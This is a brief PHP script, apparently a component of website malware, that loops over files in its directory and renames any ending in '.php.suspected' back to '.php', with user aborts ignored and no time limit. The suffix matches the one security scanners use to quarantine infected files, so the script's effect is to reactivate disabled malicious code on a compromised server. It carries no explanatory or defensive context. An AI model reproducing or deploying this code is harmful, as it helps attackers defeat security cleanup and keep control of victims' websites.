<?php
ignore_user_abort();
set_time_limit(0);

$in = scandir(".");

foreach ($in as $inn)
{

if (strpos($inn, ".php.suspected"))
{
	$inn = explode(".", $inn);
	$inn = $inn[0];
	rename ($inn.".php.suspected", $inn.".php");
}

}


?>